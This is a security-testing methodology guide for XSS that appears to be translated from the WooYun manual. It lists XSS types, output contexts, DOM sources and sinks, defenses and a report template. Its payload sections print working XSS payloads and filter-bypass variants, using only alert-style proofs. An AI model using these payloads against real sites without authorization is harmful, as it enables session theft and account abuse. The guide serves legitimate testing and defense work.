# XSS Vulnerability Analysis Methodology

> Manual English version of the WooYun XSS analysis manual.
> Original scope: 7,532 XSS cases covering stored, reflected, and DOM XSS, plus bypass and exploitation patterns.

XSS occurs when attacker-controlled data is rendered as executable browser content. The core task is to identify the output context, then prove that escaping or sanitization is missing or incomplete.

## 1. XSS Types

| Type | Persistence | Common location |
|---|---|---|
| Stored XSS | Stored in server data | Profiles, comments, messages, addresses, admin review queues |
| Reflected XSS | Echoed immediately | Search, error pages, redirect messages |
| DOM XSS | Client-side sink | `innerHTML`, `document.write`, `location`, `postMessage` |
| Blind XSS | Triggered later by staff/admin | Contact forms, feedback, logs, support tickets |

## 2. Output Contexts

| Context | Risk |
|---|---|
| HTML body | Tags and text nodes |
| Attribute value | Quote breakout and event attributes |
| JavaScript string | String breakout and code execution |
| URL attribute | `javascript:` or dangerous schemes |
| CSS | Legacy expression or URL parsing |
| JSON in HTML | Script parsing and escaping gaps |

Context determines the payload. A payload safe for one context may fail in another.

## 3. Basic Payload Families

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><img src=x onerror=alert(1)>
'</script><script>alert(1)</script>
javascript:alert(1)
```

Use harmless proof functions in authorized tests. For production reports, prefer `alert(document.domain)` or a controlled callback that does not collect user data.

## 4. Encoding and Filter Bypass

### HTML entities

```html
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;img src=x onerror=alert(1)&#x3e;
```

### Case and separator changes

```html
<ScRiPt>alert(1)</ScRiPt>
<img/src=x/onerror=alert(1)>
```

### Event alternatives

```html
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
```

### JavaScript construction

```javascript
alert(String.fromCharCode(88,83,83))
setTimeout`alert(1)`
```

## 5. DOM XSS Review

Dangerous sources:

```javascript
location.href
location.hash
document.URL
document.referrer
postMessage data
localStorage
```

Dangerous sinks:

```javascript
innerHTML
outerHTML
document.write
eval
new Function
setTimeout(string)
insertAdjacentHTML
```

Testing method: trace data from source to sink, then test the exact context where the sink writes it.

## 6. Stored and Blind XSS Workflow

1. Identify fields stored and later rendered: name, nickname, address, comment, ticket, message, file name, order note.
2. Submit context-specific benign probes.
3. View the value in all user and admin pages.
4. Check mobile, WAP, email, PDF, and admin rendering paths separately.
5. Report only a minimal proof; do not steal cookies or perform actions outside scope.

## 7. Defense

- Escape output according to context.
- Use templating systems that escape by default.
- Sanitize rich HTML with a maintained allowlist sanitizer.
- Use `textContent` instead of `innerHTML` for plain text.
- Enforce Content Security Policy as defense in depth.
- Set cookies `HttpOnly`, `Secure`, and `SameSite`.
- Validate URL schemes before rendering links.

## 8. Report Template

```text
Title: Stored/reflected/DOM XSS in [feature]
Input source: [field or parameter]
Output context: [HTML, attribute, JS, URL, DOM sink]
Payload: [minimal proof]
Trigger path: [where it executes]
Impact: [session theft risk, account action, admin execution]
Root cause: [missing context-aware escaping or unsafe sink]
Remediation: [escape/sanitize/use safe DOM APIs/CSP]
```

## 9. Lessons from WooYun Cases

- Stored XSS in admin workflows is often higher impact than public reflected XSS.
- Filters that remove only lowercase tags, one pass, or exact strings are easy to bypass.
- DOM XSS often survives server-side fixes because the unsafe sink remains in JavaScript.
- File names, media metadata, and rich-text editors are common overlooked input sources.
